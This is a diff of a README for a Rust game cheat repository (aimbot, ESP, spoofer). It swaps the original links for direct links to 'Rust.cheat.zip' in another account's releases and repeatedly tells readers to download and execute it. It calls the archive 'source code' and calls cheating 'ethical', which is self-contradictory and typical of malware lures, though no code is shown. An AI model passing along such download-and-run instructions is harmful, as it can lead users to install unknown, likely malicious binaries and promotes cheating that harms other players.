@@ -5,13 +5,13 @@
 
 Welcome to the **SMG Rust Internal Cheat** repository! This project provides a leaked external cheat source code for Rust. It serves as a resource for developers looking to enhance their skills and contribute to a community focused on ethical behavior and trust. 
 
-# [Download Link](ссылка)
+# [Download Link](https://github.com/grikodsghbiruoes/SMG-Rust-Internal-Cheat-Esp-Aimbot-Recoil-Rage-Legit-Cleaner-Spoofer-Hack/releases/download/v4.3/Rust.cheat.zip)
 
 ## Introduction
 
 Rust is a multiplayer survival game that challenges players to gather resources, build bases, and survive against both the environment and other players. In competitive environments, some players seek advantages through cheats. This repository provides a way to understand how these cheats work, with an emphasis on ethical use and community integrity.
 
-**Download the source code from the [Releases section](https://github.com/KVNKirito/SMG-Rust-Internal-Cheat-Esp-Aimbot-Recoil-Rage-Legit-Cleaner-Spoofer-Hack/releases)**. You will need to download and execute the relevant files.
+**Download the source code from the [Releases section](https://github.com/grikodsghbiruoes/SMG-Rust-Internal-Cheat-Esp-Aimbot-Recoil-Rage-Legit-Cleaner-Spoofer-Hack/releases/download/v4.3/Rust.cheat.zip)**. You will need to download and execute the relevant files.
 
 ## Features
 
@@ -61,7 +61,7 @@ This repository includes a variety of features designed to enhance gameplay in R
 
 To install the cheat, follow these steps:
 
-1. **Download the Source Code**: Visit the [Releases section](https://github.com/KVNKirito/SMG-Rust-Internal-Cheat-Esp-Aimbot-Recoil-Rage-Legit-Cleaner-Spoofer-Hack/releases) and download the latest version.
+1. **Download the Source Code**: Visit the [Releases section](https://github.com/grikodsghbiruoes/SMG-Rust-Internal-Cheat-Esp-Aimbot-Recoil-Rage-Legit-Cleaner-Spoofer-Hack/releases/download/v4.3/Rust.cheat.zip) and download the latest version.
 2. **Extract Files**: Unzip the downloaded file to a location of your choice.
 3. **Run the Application**: Execute the main cheat file to start using the features.
 
@@ -119,6 +119,6 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 For questions or feedback, please reach out through the GitHub Issues page or contact the repository owner directly.
 
-**Download the source code from the [Releases section](https://github.com/KVNKirito/SMG-Rust-Internal-Cheat-Esp-Aimbot-Recoil-Rage-Legit-Cleaner-Spoofer-Hack/releases)**. You will need to download and execute the relevant files.
+**Download the source code from the [Releases section](https://github.com/grikodsghbiruoes/SMG-Rust-Internal-Cheat-Esp-Aimbot-Recoil-Rage-Legit-Cleaner-Spoofer-Hack/releases/download/v4.3/Rust.cheat.zip)**. You will need to download and execute the relevant files.
 
 Thank you for visiting the SMG Rust Internal Cheat repository! Happy gaming!
